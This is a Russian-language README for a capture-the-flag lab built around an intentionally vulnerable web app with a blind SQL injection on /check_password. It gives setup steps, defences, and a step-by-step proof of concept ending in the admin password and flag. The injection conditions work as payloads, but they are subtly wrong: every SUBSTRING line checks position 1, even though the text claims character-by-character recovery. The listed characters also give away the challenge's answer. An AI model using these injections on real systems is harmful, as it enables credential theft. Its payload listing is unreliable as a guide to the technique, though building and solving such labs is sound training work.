# CTF Challenge: Blind SQL Injection Exploit
Это приложение демонстрирует уязвимость, связанную с Blind SQL Injection. Участникам CTF нужно извлечь пароль администратора из базы данных, используя слепую SQL-инъекцию, а затем войти в систему с этим паролем.
## Описание уязвимости
Уязвимость находится на эндпоинте `/check_password`, где приложение использует сырой SQL-запрос для проверки условий. Злоумышленник может использовать Blind SQL Injection для извлечения пароля администратора посимвольно.

## Почему это происходит?
- Приложение использует сырой SQL-запрос для проверки условий.
- Пользовательский ввод не экранируется, что позволяет злоумышленнику внедрить произвольный SQL-код.
- Приложение возвращает бинарный ответ (`True`/`False`), что позволяет злоумышленнику извлекать информацию посимвольно.

## Способы защиты
1. **Использование ORM** – использовать ORM (например, SQLAlchemy) для работы с базой данных, чтобы избежать написания сырых SQL-запросов.
2. **Экранирование пользовательского ввода** – всегда экранировать пользовательский ввод перед использованием в SQL-запросах.
3. **Использование prepared statements** – использовать подготовленные выражения для предотвращения SQL-инъекций.
4. **Валидация входных данных** – проверять пользовательский ввод на соответствие ожидаемым форматам и типам данных.

## Запуск приложения
### Требования:
- Docker
- Docker Compose

### Инструкция по запуску:
1. Клонируйте репозиторий:
   ```bash
   git clone git@github.com:pegasak/Blind_SQLi.git
2. Перейдите в директорию проекта:
    ```bash
   cd Blind_SQLi
3. Запустите приложение:
    ```bash
   docker-compose up --build
4. Приложение будет доступно по адресу: `http://localhost:5000`

### PoC-эксплоит для получения флага
1. Зарегистрируйтесь как обычный пользователь через `/register`
2. Зайдите в систему под своим созданным аккаунтом
3. Далее перейдите на Эндпоинт для добавления записи на страницу `/text` и попробуйте добавить пост `Add post`
4. Перейдите на домашнюю страницу `/`
5. Вы увидите, что все посты читаемы для вас кроме поста админа с ником `Kirill`
6. В правом верхнем углу нажмите на кнопку выхода из аккаунта `Log out`
7. Теперь вы неавторизованы.
8. Перейдите на эндпоинт `Check password` и начните SQL-инъкцию, чтобы вытащить пароль админа из базы данных.
9. Эксплуатация уязвимости:
   1) Определение длины пароля. Введите в поле `Username` ник админа, а в поле `SQL Condition`:
      ```sql
      LENGTH(PASSWORD) = 12
   2) Если длина пароля действительно 12, то вы получите ответ `Result: True`, иначе `Result: false`.
   3) Восстановление пароля посимвольно. Теперь мы будем перебирать каждый символ, начиная с первого. Введите в поле `Username` ник админа, а в поле `SQL Condition`:
      ```sql
      SUBSTRING(password, 1, 1) = 'R'
      SUBSTRING(password, 1, 1) = 'o'
      SUBSTRING(password, 1, 1) = 'o'
      SUBSTRING(password, 1, 1) = 't'
      SUBSTRING(password, 1, 1) = '2'
      SUBSTRING(password, 1, 1) = '2'
      SUBSTRING(password, 1, 1) = '3'
      SUBSTRING(password, 1, 1) = '3'
      SUBSTRING(password, 1, 1) = '@'
      SUBSTRING(password, 1, 1) = 'l'
      SUBSTRING(password, 1, 1) = 'k'
      SUBSTRING(password, 1, 1) = 'a'
   4) После перебора всех символов получаем полный пароль админа.
10. Переходим на `login`.
11. Вводим `Kirill` и найденный пароль.
12. После входа видим флаг на домашней странице в после админа.